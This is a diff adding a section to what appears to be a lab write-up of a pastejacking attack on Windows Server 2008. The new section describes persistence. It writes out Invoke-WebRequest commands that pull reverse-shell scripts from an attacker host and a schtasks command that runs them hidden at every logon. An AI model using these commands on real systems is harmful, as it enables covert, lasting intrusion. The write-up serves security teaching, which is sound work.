@@ -100,3 +100,30 @@ Where:
 - `$client.Close()`: This line closes the TCP client.
 
 # IMMAGINE POWERSHELL WIN SERVER 2K8
+
+## Persistence
+
+Persistence in a cybersecurity context refers to the ability of an attacker to maintain access to a compromised system, even after the system has been rebooted, or the initial attack vector has been closed. In this project, persistence was achieved by uploading two files, "Persistence.ps1" and "persistence.vbs", to the same location as the webpage used for pastejacking.
+
+1. **Persistence.ps1**: This file contains the same code as the reverse shell. When this script is run on the victim's machine, it spawns a reverse shell that connects back to the attacker's machine.
+
+2. **persistence.vbs**: This file is a VBScript that is used to run the "Persistence.ps1" script in the background. Running the script in the background makes it less likely for the victim to notice the malicious process, as it won't appear in the foreground or affect the use of the system.
+
+The process can be broken down into the following steps:
+
+- **Uploading the Scripts**: The "Persistence.ps1" and "persistence.vbs" files are uploaded to the same location as the webpage used for pastejacking.
+
+- **Downloading the Scripts**: Once the victim's machine is compromised, the scripts are downloaded manually using the reverse shell with the commands below.
+
+```powershell
+Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.ps1" -OutFile "C:\Persistance.ps1"
+Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.vbs" -OutFile "C:\Persistance.vbs"
+```
+
+- **Setting the Scripts to Run at Logon**: The seguent command is executed `schtasks /create /tn "Persistance" /tr "wscript.exe 'C:\Persistance.vbs'" /sc onlogon /ru "BUILTIN\Administrators" /rp ""` to set the scripts to run at every log on as administrator by creating a task named "Persistance". This ensures that the attacker retains access to the machine, even if it is rebooted.
+
+(Note: Insert screenshot of the scripts here)
+
+(Note: Insert code snippet of the "Persistence.ps1" and "persistence.vbs" scripts here)
+
+This demonstration serves as a reminder of the potential dangers of running untrusted scripts and the importance of maintaining robust security measures to protect against such threats.
